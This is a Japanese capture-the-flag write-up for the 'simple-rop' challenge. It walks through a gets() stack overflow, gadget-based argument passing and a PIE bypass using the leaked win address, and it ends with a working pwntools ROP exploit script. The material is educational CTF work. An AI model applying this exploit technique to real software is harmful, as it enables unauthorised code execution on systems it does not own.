# simple-rop (2026/02/14)

Pwntoolsに頼り切りの自分の弱き心を断ち切るWriteupです。

`rsp`や`rip`の挙動など、自分が理解から逃げていたものを、この問題を通じて解説しています。

誰でも理解できる事を心掛けました。是非、最後まで見ていってください。

## 問題

`win(0xdeadbeefcafebabe, 0x1122334455667788, 0xabcdabcdabcdabcd)` を呼び出してシェルを取ろう! フラグは `/flag.txt` にあります。



## 概要

タイトルにある ROP(Return-Oriented Programming) というのは、実行ファイル内にすでに存在する短い命令列を、チェーンのようにつなぎ合わせることで、お好みの処理を実行させる手法です。

simpleと書いてあるし、今回はあんまり難しい感じでは無さそう。見ていきましょう。

長いな～と思ったら、なんとなく流し見しちゃっても構いません。

```
// gcc -o chal main.c -fno-stack-protector -O0

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// ROP gadgets
__asm__(
    "pop %rdi\nret\n"
    "pop %rsi\nret\n"
    "pop %rdx\nret\n"
);

// call win(0xdeadbeefcafebabe, 0x1122334455667788, 0xabcdabcdabcdabcd) to get a shell!

void win(unsigned long long param1, unsigned long long param2, unsigned long long param3) {
    char command[] = "/bin/sh";
    
    if(param1 == 0xdeadbeefcafebabe) {
        printf("Check 1 passed: param1 == 0xdeadbeefcafebabe\n");
    } else {
        printf("Check 1 failed: param1 != 0xdeadbeefcafebabe (actual: %llx)\n", param1);
        exit(1);
    }

    if (param2 == 0x1122334455667788) {
        printf("Check 2 passed: param2 == 0x1122334455667788\n");
    } else {
        printf("Check 2 failed: param2 != 0x1122334455667788 (actual: %llx)\n", param2);
        exit(1);
    }

    if (param3 == 0xabcdabcdabcdabcd) {
        printf("Check 3 passed: param3 == 0xabcdabcdabcdabcd\n");
    } else {
        printf("Check 3 failed: param3 != 0xabcdabcdabcdabcd (actual: %llx)\n", param3);
        exit(1);
    }

    printf("All checks passed! Spawning shell...\n");
    execve(command, NULL, NULL);
}

int main(void) {
    char buffer[64];
    printf("address of win function: %p\n", win);
    printf("input > ");
    gets(buffer);
    return 0;
}

__attribute__((constructor))
void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

なるほどなるほど。確かに結構優しそうではある。

```
int main(void) {
    char buffer[64];
    printf("address of win function: %p\n", win);
    printf("input > ");
    gets(buffer);
    return 0;
}
```

まず`buffer[64]`が宣言され、その次に`address of win function`と出力された後に、`win`のアドレスが表示されます。

```
printf("address of win function: %p\n", win);
```

`%p`は`printf`系のフォーマット指定子と呼ばれるものであり、今回であれば後続する`win`のポインタの値を表示するものです。

ここで、`win`というものが登場しました。

```
void win(unsigned long long param1, unsigned long long param2, unsigned long long param3) {
    char command[] = "/bin/sh";
    
    if(param1 == 0xdeadbeefcafebabe) {
        printf("Check 1 passed: param1 == 0xdeadbeefcafebabe\n");
    } else {
        printf("Check 1 failed: param1 != 0xdeadbeefcafebabe (actual: %llx)\n", param1);
        exit(1);
    }

    if (param2 == 0x1122334455667788) {
        printf("Check 2 passed: param2 == 0x1122334455667788\n");
    } else {
        printf("Check 2 failed: param2 != 0x1122334455667788 (actual: %llx)\n", param2);
        exit(1);
    }

    if (param3 == 0xabcdabcdabcdabcd) {
        printf("Check 3 passed: param3 == 0xabcdabcdabcdabcd\n");
    } else {
        printf("Check 3 failed: param3 != 0xabcdabcdabcdabcd (actual: %llx)\n", param3);
        exit(1);
    }

    printf("All checks passed! Spawning shell...\n");
    execve(command, NULL, NULL);
}
```

こちらですね。以下の条件が通った場合、シェルが起動するようにプログラムされています。

```
param1 == 0xdeadbeefcafebabe
param2 == 0x1122334455667788
param3 == 0xabcdabcdabcdabcd
```

`win`の引数として第1引数に`param1`を、第2引数に`param2`を、第3引数に`param3`を指定します。

なおかつ中身を上記のように合わせないと `All checks passed! Spawning shell...` が出力されず、途中で処理が落ちてしまいます。

普通に実行していても、`main`では`win`が実行されることはないです。

つまり、まずは何等かの方法で`win`を実行する必要があることが分かります。

あ、補足です。

```
__attribute__((constructor))
void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

これはまあ、おまじないというか、お約束だと思って無視してもらって大丈夫です。

## スタックオーバーフロー

```
int main(void) {
    char buffer[64];
    printf("address of win function: %p\n", win);
    printf("input > ");
    gets(buffer);
    return 0;
}
```

注目してほしいものはこちらです。

```
gets(buffer);
```

こちら、非常に危険です。

「何文字まで読むのか？」を指定できていないため、`buffer`の範囲外を超えて値を書き込めてしまう可能性があります。

つまり、スタックで考えると後述するようなリスクがあります。

```
~ main処理開始時 ~

<高アドレス側> ↓スタックはこのように向かう
mainのリターンアドレス(後述)
saved rbp(後述)
buffer[63]
...
buffer[0]
<低アドレス側>
```

通常はこのようになっています。

最初にmainが実行される際、`mainのリターンアドレス`というものがスタックに積まれます。`main`は最初に実行されるわけではなく、何者かに実行されたものです。よって「mainの処理が終わったらここに帰ってきなよ～」というアドレスが用意されます。それがリターンアドレスです。

その次に積まれるのは`saved rbp`です。`RBP`は現在の関数のスタックフレームの基準位置を指すレジスタです。これを基準にローカル変数やリターンアドレスの位置を示すことができるため、まあ超ざっくり言えば計算の時便利なので残している感じです。

次に、定義されたbufferが入ります。ここで注意なのが、`saved rbp`の次に

```
buffer[0],buffer[1],...,buffer[63]
```

というわけではなく、一気に`buffer`の領域が確保され、添え字が増えるごとに高アドレスになっていく性質上

```
<高アドレス側> ↓スタックはこのように向かう
mainのリターンアドレス(後述)
saved rbp(後述)
buffer[63]
...
buffer[0]
<低アドレス側>
```

こうなるわけです。

というわけで、やっと攻撃の話に移ります。

`buffer`の添え字を63からオーバーさせてmainのリターンアドレスを改竄します。

本来はmainを呼び出した処理に帰るはずが、攻撃者が書き込んだ`win`に向かうようになります。

```
~ オーバーフロー発生 ~
<高アドレス側> ↓スタックはこのように向かう
書き込まれたwinのアドレス
aaaaaaaaaaaaaaaa(padding : 文字列稼ぎ)
aaaa (元buffer)
aaaa (元buffer)　　　　　
aaaa (元buffer)
<低アドレス側>
```

このようになり、リターンアドレスとして`win`のアドレスが参照され、`win`へ向かいます。

つまり

```
A * ?(padding) + win address
```

こうなるわけです。

普通のスタックオーバーフロー問なら、ここで終わりです。

しかし、今回はwin関数に引数が3つ必要とされています。

```
void win(unsigned long long param1, unsigned long long param2, unsigned long long param3)
```

ここから、ROPが始まります。

## ROP

プログラム上部にあった

```
// ROP gadgets
__asm__(
    "pop %rdi\nret\n"
    "pop %rsi\nret\n"
    "pop %rdx\nret\n"
);
```

こちらが`ROP gadgets`と呼ばれるものになります。

`ROP gadgets`は、先ほども紹介した実行ファイル内に既に存在する短い命令列です。

今回の問題では、`win`に引数を渡すためのガジェットがあらかじめ用意されています。優しいですね。

本来なら`ROPgadget`というコマンドなどを用いて、自分で探す必要があります。

では、このアセンブリについて解説していきます。

```
pop rdi; ret
```

こちらは、まず

```
pop rdi
ret
```

の2つに分けられます。

`pop rdi`というのは、`rsp`が指すアドレスから値を取り出し、`rdi`に格納するというものです。

```
rdi → 第1引数
rsi → 第2引数
rdx → 第3引数
```

つまり、`rsp`が指しているメモリ上に第1引数の値があれば、それを`rdi`に格納することが出来るわけです。

また、今のスタック先頭を使い終わったため、次の要素を指すように`rsp`を+8します。つまり

```
りんご
ばなな
ぶどう
```

があるとして、現時点でスタックの先頭はりんごです。こちらをpopすると

```
ばなな
ぶどう
```

となります。次はばななの番です。よって、rsp+8をすることで、先頭をばななにしています。

分かりにくかったらごめんなさい。

次に

```
ret
```

です。こちらは新キャラである`rip`が関連します。

`rip`は、CPUが次に実行する命令アドレスを保持するレジスタです。

`ret`を行う際、アセンブリでは

```
rip = [rsp] ※rspはアドレスそのもの、[rsp]はそのアドレスに入っている値
rsp += 8
```

という処理が行われています。

これはどういう事かと言いますと、プログラムで言う`return`を行う際、アセンブリでは`ret`が行われています。

こちらはリターンアドレスを参照し、そのアドレスへ移動するというものです。

現時点ではrspはリターンアドレスを指しているため、ripにはリターンアドレスが入ります。

そして、rsp側は「もうリターンアドレスの出番は終わり！」と考え、`rsp`を新たに8増やすことで、次へ先頭を移るというわけです。

これが、第1~第3引数まで繰り返されます。そして最後に、`win`を実行することで、引数を指定した状態で`win`へ移動するわけです。

実際のペイロードを考えてみます。

```
"A" * ? (リターンアドレスまでのパディング)
+
pop rdi; ret
+
第1引数
+
pop rsi; ret
+
第2引数
+
pop rdx; ret
+
第3引数
```

ネタバレすると、このようになります。

一瞬「第1引数をpopしてぇのに第1引数の前に置いたらなんも出てこねぇだろ！」と思われるかもしれません。

しかし、ここで先ほど長ったらしく感じていた座学が活きます。

まず、プログラム側を弄ることはできないため、必ず`main側のret`は発生します。

この時点で、`rsp`は既にリターンアドレスを指しています。まあ、今回は`pop rdi; ret`ですね。

で、main側の`ret`により

```
rip = [rsp]
```

が発生し、ripが`pop rdi; ret`を指します。

で、次に

```
rsp += 8
```

が発生します。前述した`ret`の挙動ですね。

よって「ripくん、お先～」といったようにrspが`pop rdi; ret`の次にある`0xdeadbeefcafebabe`を指すようになります。

あとは、ripが`pop rdi`を実行します。popによりrspが+8され、`pop rsi; ret`を指すようになります。

次に`ret`が実行されれば、`[rsp]`に格納されている`pop rsi; ret`のアドレスが`rip`に入り、`rsp`はさらに8バイト進んで第2引数である`0x1122334455667788`を指します。

このような挙動をするため、先ほど紹介したペイロードの順番でないと、正しく動作しません。

## 最終準備

では、ここで私たちが知りたい情報は3つあります。

```
buffer[0] ~ リターンアドレス直前までのパディング
win関数のアドレス
ガジェット三銃士のアドレス
```

まず、パディングですね。こちらは`cyclic`という便利なツールによって求めることが出来ます。

まず、適当に`cyclic 100`などを指定します。

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

なんかすごいのが出てきます。こちら、どの位置を上書きしたか特定できるよう、4バイトの部分列が重複しないパターンが生成されます。

次に、gdbで手元にあるプログラム(chal)を実行します。

あ、`chmod +x chal`を忘れずに。これがないと実行できませんので。

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000000130f <+0>:     endbr64
   0x0000000000001313 <+4>:     push   rbp
   0x0000000000001314 <+5>:     mov    rbp,rsp
   0x0000000000001317 <+8>:     sub    rsp,0x40
   0x000000000000131b <+12>:    lea    rax,[rip+0xfffffffffffffecd]        # 0x11ef <win>
   0x0000000000001322 <+19>:    mov    rsi,rax
   0x0000000000001325 <+22>:    lea    rax,[rip+0xe51]        # 0x217d
   0x000000000000132c <+29>:    mov    rdi,rax
   0x000000000000132f <+32>:    mov    eax,0x0
   0x0000000000001334 <+37>:    call   0x10c0
   0x0000000000001339 <+42>:    lea    rax,[rip+0xe5a]        # 0x219a
   0x0000000000001340 <+49>:    mov    rdi,rax
   0x0000000000001343 <+52>:    mov    eax,0x0
   0x0000000000001348 <+57>:    call   0x10c0
   0x000000000000134d <+62>:    lea    rax,[rbp-0x40]
   0x0000000000001351 <+66>:    mov    rdi,rax
   0x0000000000001354 <+69>:    mov    eax,0x0
   0x0000000000001359 <+74>:    call   0x10e0
   0x000000000000135e <+79>:    mov    eax,0x0
   0x0000000000001363 <+84>:    leave
   0x0000000000001364 <+85>:    ret
```

`disass main`でアドレスを把握します。

```
0x0000000000001364 <+85>:    ret
```

ここで私たちが汚す予定のリターンアドレスを参照していますね。そのため、いったんここにブレークポイント(一時停止)を置きます。

```
gdb-peda$ b *main+85
Breakpoint 1 at 0x1364
```

よし、実行していきましょう。inputを聞かれるので、先ほど`cyclic`で出力したなんかすごい文字列を入れていきます。

```
rsp: 0x7fffffffdce8 ("saaataaauaaavaaawaaaxaaayaaa")
```

すると、このようにrspが何かとんでもないものを指しています。先ほど述べたように、`ret`以前に`rsp`はリターンアドレスを指しています。

よって、先頭の4バイトである`saaa`を抽出します。

これで準備完了です。`cyclic -l saaa`をすることで、`72`という数字が出力されます。

つまり、パディングを72文字埋めることで、リターンアドレス直前までたどり着くことができます。

```
A * ? → A * 72
```

次に、残り2つのアドレスです。`win`のアドレスは実行の際に出てくるとして、ガジェット三銃士は分かりません。

リモートで実行されるものと配布されたもののアドレスが同じであれば、仕事は早いのですが...

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

残念ながら`PIE enabled`となっています。

これにより、実行するたびにプログラムの先頭アドレスがランダム化されます。

よって、手元のガジェット三銃士のアドレスをそのまま用いても、リモート側は「なんだこれ」となってしまうわけです。

しかし、今回はプログラムのはじめに`win`のアドレスがリークされます。

そのため、手元のプログラムと参照して固定オフセットを把握することで、ガジェット三銃士の位置を特定します。

なんのこっちゃ？と思われた方はこちらを見てください。簡単なイメージ図です。

```
【手元の実行ファイル】
150 : ぶどう
↑ 20の間隔
170 : りんご (このアドレスがリーク)
```

```
【リモートの実行ファイル】
400 : ここが「ぶどう」だ！と推測可能
↑ 20の間隔であると確認しているため
420 : りんご (このアドレスがリーク)
```

つまり、先頭が必ずどこかに移動するけど、先頭と`win`の位置関係を把握しておけば、`win`から先頭を把握できるよね。というわけです。

というわけで、ここからは最強の`Pwntools`に任せて面倒な計算を任せてみましょう。

## PoC

手順としては

```
手元のプログラム(chal)
↓
プログラムの先頭アドレス(PIEベースアドレス)から比較したwinとガジェット三銃士のオフセットを特定
↓
リモートへ接続して実行。winの実アドレスリーク
↓
プログラムの先頭アドレスを逆算する
↓
プログラムの先頭アドレス + 各オフセット
↓
ガジェット三銃士のアドレス特定
↓
ペイロード構築
```

となります。プログラムは以下の通り。
```
from pwn import *

context.binary = elf = ELF("./chal", checksec=False)
context.log_level = "info"

HOST = "xx.xxx.xxx.xxx."
PORT = xxxxx

p = remote(HOST, PORT)

# win のリークを取得
p.recvuntil(b"address of win function: ")
win_leak = int(p.recvline().strip(), 16)

# 手元のchalにて、先頭プログラムとwinのオフセットを取得
win_offset = elf.sym["win"]

# その情報から、リモートで実行されているプログラムの先頭アドレスを取得
elf.address = win_leak - win_offset

log.info(f"win leak = {hex(win_leak)}")
log.info(f"PIE base = {hex(elf.address)}")

# 実アドレスで gadget を取得
rop = ROP(elf)
# これだけで取得できてしまう！
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
ret     = rop.find_gadget(["ret"]).address

win = elf.sym["win"]

log.info(f"pop rdi ; ret = {hex(pop_rdi)}")
log.info(f"pop rsi ; ret = {hex(pop_rsi)}")
log.info(f"pop rdx ; ret = {hex(pop_rdx)}")
log.info(f"win           = {hex(win)}")

# ペイロード構築
payload = flat(
    b"A" * 72,

    pop_rdi,
    0xdeadbeefcafebabe,

    pop_rsi,
    0x1122334455667788,

    pop_rdx,
    0xabcdabcdabcdabcd,

    # stack alignment
    ret,

    win,
)

p.sendlineafter(b"input > ", payload)
p.interactive()
```

なお、winを呼ぶ直前にretを1つ挟んでいるのは、x86-64のスタックアライメントを調整するためです。

こちらはすみません...お約束です。自分の実力ではまだ説明できないです ><

こちらを、指定されたアドレスとポートに置き換えて、chalと同じディレクトリに配置すればフラグを取得可能です。
